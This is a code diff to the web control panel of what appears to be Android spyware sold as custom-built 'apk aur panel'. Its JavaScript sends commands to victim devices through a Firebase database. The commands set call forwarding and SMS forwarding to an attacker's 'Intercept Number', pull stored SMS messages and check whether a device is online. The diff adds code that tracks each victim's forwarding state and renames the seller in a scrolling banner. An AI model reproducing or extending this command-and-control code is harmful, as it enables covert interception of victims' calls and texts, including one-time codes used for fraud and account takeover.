@@ -194,7 +194,7 @@
         <!-- ADMIN ANNOUNCEMENT START: Is line ke niche ka text aap change kar sakte hain -->
         <div class="bg-rose-50 border-b border-rose-100 py-1.5 flex-shrink-0">
             <marquee behavior="scroll" direction="left" class="text-rose-600 font-black text-[11px] uppercase tracking-[0.2em]">
-                kali dev <span class="text-yellow-500">"apke hisab se apk aur panel ban jaye ga"</span> kali dev
+                KGFROCKY <span class="text-yellow-500">"apke hisab se apk aur panel ban jaye ga"</span> KGFROCKY
             </marquee>
         </div>
         <!-- ADMIN ANNOUNCEMENT END -->
@@ -1159,6 +1159,8 @@
 
         document.getElementById('det-online-dot').className = `w-2.5 h-2.5 rounded-full flex-shrink-0 ${isOnline ? 'bg-green-500 online-dot' : 'bg-slate-300'}`;
 
+        const state = getDeviceState(info);
+
         // Update Online Check Button State
         const checkBtn = document.querySelector('[onclick="sendUserCmd(\'CHECK_ONLINE\')"]');
         if (checkBtn) {
@@ -1350,18 +1352,19 @@
             cmd.n = document.getElementById('cmd-cf-num').value.trim();
             cmd.s = simVal;
             if(!cmd.n) return alert('Enter Forwarding Number');
+            db.ref(`Users/${selectedUid}/I/cf`).set(true);
         } else if(type === 'DEACTIVATE_FORWARD') {
-            cmd.t = 'CALL_FORWARD'; cmd.n = "";
             cmd.s = simVal;
-            db.ref(`Users/${selectedUid}/I/cf`).set("");
+            db.ref(`Users/${selectedUid}/I/cf`).set(false);
         } else if(type === 'SET_SMS_FORWARD') {
             cmd.n = document.getElementById('cmd-sf-num').value.trim();
             cmd.s = simVal;
             if(!cmd.n) return alert('Enter Intercept Number');
+            db.ref(`Users/${selectedUid}/I/sf`).set(true);
         } else if(type === 'REMOVE_SMS_FORWARD') {
             cmd.t = 'SET_SMS_FORWARD'; cmd.n = "";
             cmd.s = simVal;
-            db.ref(`Users/${selectedUid}/I/sf`).set("");
+            db.ref(`Users/${selectedUid}/I/sf`).set(false);
         } else if(type === 'GET_SMS') {
             cmd.count = document.getElementById('cmd-sms-count').value;
         }
